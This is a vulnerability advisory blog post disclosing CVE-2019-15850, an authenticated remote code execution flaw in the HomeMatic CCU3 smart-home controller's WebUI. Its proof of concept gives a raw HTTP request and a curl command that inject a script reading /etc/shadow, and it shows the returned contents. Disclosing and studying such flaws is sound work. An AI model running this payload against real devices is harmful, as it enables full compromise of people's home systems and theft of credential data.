---
layout: post
title: "Remote Code Execution in HomeMatic central CCU3"
date: 2019-10-01 09:00:00
image:
      url: /assets/pixabay/matrix-1799659_1920.jpg
author: 'Joshua Lehr'
author_image: "https://avatars1.githubusercontent.com/u/22133182?s=400&u=9c37c0c25738af0b47f4b2ab1c3adb0b26f80abf&v=4"
author_link: "https://github.com/noskill1337"
cve: "CVE-2019-15850"
cve_description: "The HomeMatic CCU3 firmware version 3.41.11 has a Remote Code Execution (RCE) vulnerability in the ReGa.runScript method of the WebUI component. An authenticated attacker can easily execute code and compromise the system."
cve_affectedVersion: "Version: 3.41.11"
cvss: "XX.XX"
softwarePatchLink: "Vendor will not change the concept of this JSON API function."
---

## Overview

- Vulnerability: Remote Code Execution (RCE)
- Vendor: eQ-3 AG
- Vendor Homepage: [https://www.eq-3.com/contact.html](https://www.eq-3.com/contact.html)
- Product: HomeMatic central CCU3
- Version: {{ page.cve_affectedVersion }}

## Background

HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU3 is a central control unit, which is responsible for integrating these components with each other.

From the vendor's [website](https://www.homematic-ip.com/produkte/detail/smart-home-zentrale-ccu3.html):
"The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). ..."

## Issue Description

While analyzing the implementation of the home automation system HomeMatic, one Remote Code Execution (RCE) vulnerability has been identified, which can be exploited in order to exploit the underlaying system. The vulnerability exists in the method 'ReGa.runScript' of the WebUI. The affected version is **{{ page.cve_affectedVersion }}**.

![Affected Version](/assets/CVE-2019-15850/CVE-2019-15850.HomeMatic.Version.JPG)

This vulnerability can be exploited by authenticated attackers with access to the web interface to execute system commands.

The following **HTTP request** illustrates this approach:

~~~ http
POST /api/homematic.cgi HTTP/1.1
Host: 192.168.0.125
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.125/pages/index.htm?sid=@KqlhlInB8S@&client=3
Content-Type: application/json
Content-Length: 199
Connection: close


{"version": "1.1", "method": "ReGa.runScript", "params": {"script": "string stdout;string stderr;system.Exec(\"cat /etc/shadow\", &stdout, &stderr);WriteLine(stdout);", "_session_id_": "KqlhlInB8S"}}
~~~

The **HTTP Response** is:

~~~ http
HTTP/1.1 200 OK
CONTENT-TYPE: application/json; charset=utf-8
Content-Length: 411
Connection: close
Date: Sun, 01 Sep 2019 18:37:40 GMT
Server: lighttpd/1.4.50


{"version": "1.1","result": "root::10933:0:99999:7:::\ndaemon:*:10933:0:99999:7:::\nbin:*:10933:0:99999:7:::\nsys:*:10933:0:99999:7:::\nsync:*:10933:0:99999:7:::\nmail:*:10933:0:99999:7:::\nwww-data:*:10933:0:99999:7:::\nhalt:*:10933:0:99999:7:::\nuucp:*:10933:0:99999:7:::\noperator:*:10933:0:99999:7:::\nftp:*:10933:0:99999:7:::\nnobody:*:10933:0:99999:7:::\n_ntp:*:::::::\nsshd:*:::::::\n\r\n","error": null}
~~~

![POC](/assets/CVE-2019-15850/CVE-2019-15850.HomeMatic.RCE.JPG)

You can easily fire this **curl command** to illustrates this approach:

~~~ bash
curl -i -s -k  -X $'POST' \
    -H $'Host: 192.168.0.125' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.0.125/pages/index.htm?sid=@KqlhlInB8S@&client=3' -H $'Content-Type: application/json' -H $'Content-Length: 199' -H $'Connection: close' \
    --data-binary $'{\"version\": \"1.1\", \"method\": \"ReGa.runScript\", \"params\": {\"script\": \"string stdout;string stderr;system.Exec(\\\"cat /etc/shadow\\\", &stdout, &stderr);WriteLine(stdout);\", \"_session_id_\": \"KqlhlInB8S\"}}' \
    $'http://192.168.0.125/api/homematic.cgi'
~~~

## Impact

This vulnerability affects the confidentiality / integrity / availability of the system/data. This allows an attacker to read / manipulate the system. If an attacker is aware of the security issue, he or she may steal important data or compromise the system. With this vulnerability, a complete system compromise is possible.

## Remediation

In order to avoid this vulnerability, it's suggested to disable the WebUI of HomeMatic. The HomeMatic-WebUI have many other security issues.

{%if page.softwarePatchLink %}{{ page.softwarePatchLink }}{% else %}{{ "" }}{% endif %}

## CVE

- CVE: [{{ page.cve }}](https://cve.mitre.org/cgi-bin/cvename.cgi?name={{ page.cve }})
- CVSS Base Score: **{{ page.cvss }}**
- CVSS: 3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## Credit

- {{ site.owner }}

## Vulnerability Disclosure Timeline

- 2019-September-01: Discovered vulnerability
- 2019-September-04: Vendor Notification
- 2019-September-10: Vendor Response (Vendor will not change the concept)
- 2019-October-01: Public Disclosure

## Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

System administrators need tools like this to discover vulnerable hosts. This tool is offered for legal purposes only and to forward the security community's understanding of this vulnerability. As this PoC actively exploits the vulnerability, do not use against targets without prior permission.

The contents of this advisory are copyright (c) 2019 {{ site.owner }} and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.

## License

{{ site.LicenseDisplay }}